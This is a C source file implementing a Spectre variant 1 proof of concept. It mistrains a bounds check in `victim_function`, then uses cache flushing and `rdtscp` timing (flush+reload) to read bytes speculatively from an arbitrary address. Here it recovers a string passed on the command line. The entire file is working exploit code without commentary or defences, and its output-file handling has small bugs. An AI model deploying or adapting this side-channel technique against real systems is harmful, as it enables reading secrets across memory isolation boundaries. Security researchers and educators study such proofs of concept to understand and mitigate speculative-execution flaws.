#include <stdio.h>
#include <inttypes.h>

#ifdef _MSC_VER
#include <intrin.h>
#else
#include <x86intrin.h>
#endif

uint32_t TICK = 0;
size_t isFile = 0;
FILE *output = NULL;

#define CACHE_HIT 80
#define COINCIDENCE 4
#define CACHE_LINE 4096
#define MAX_ITERS 1000

unsigned int training_size = 32;
uint8_t training_array[32];
uint8_t hack_array[256 * CACHE_LINE];

uint8_t temp = 0;

void victim_function(uint64_t x) {
    if (x < training_size) {
        temp ^= hack_array[training_array[x] * CACHE_LINE]; // Anti optimizations
    }
}

uint8_t read_byte(size_t addr) {
    addr -= (uint64_t) &training_array;

    int bytes_score[256];
    for (int i = 0; i < 256; i++)
        bytes_score[i] = 0;

    int best = -1;
    for (int iters = 0; iters < MAX_ITERS; iters++) {
        for (int i = 0; i < 256; i++) { // Cache flush
            _mm_clflush(&hack_array[i * CACHE_LINE]);
        }

        int x = -1;
        for (int j = 0; j < training_size; j++) { // Magic anti optimizations trick!
            _mm_clflush(&training_size);
            x = ((j % 5)) | (((j % 5) - 1) >> 8);
            x = 31 ^ (x & (addr ^ 31));
            victim_function(x);
        }

        for (int i = 1; i < 256; i++) {
            register uint64_t time = __rdtscp(&TICK);
            temp ^= hack_array[i * CACHE_LINE];
            time = __rdtscp(&TICK) - time;

            if (time <= CACHE_HIT) {
                bytes_score[i]++;
            }
        }

        uint8_t cur_best = 0;
        for (int j = 1; j < 256; j++) {
            if (bytes_score[cur_best] <= bytes_score[j]) {
                cur_best = j;
            }
        }

        if (bytes_score[cur_best] >= COINCIDENCE) {
            best = cur_best;
            break;
        }
    }

    return best;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Requires <data> [<output_file>]");
        return -1;
    }

    uint32_t len = 0;
    while (argv[1][++len]);
    char *secret = argv[1];

    output = argc > 2 ? fopen(argv[2], "w") : stdout;
    fprintf(output, "Accessed data: ");

    uint64_t addr = (uint64_t) secret;
    for (uint64_t i = 0; i < len; i++) {
        fprintf(output, "%c", read_byte(addr + i));
    }
    fprintf(output, "\n");

    if (isFile != 0 && !fclose(output)) {
        fprintf(stderr, "Writing in output failed!");
        return -1;
    }

    return 0;
}
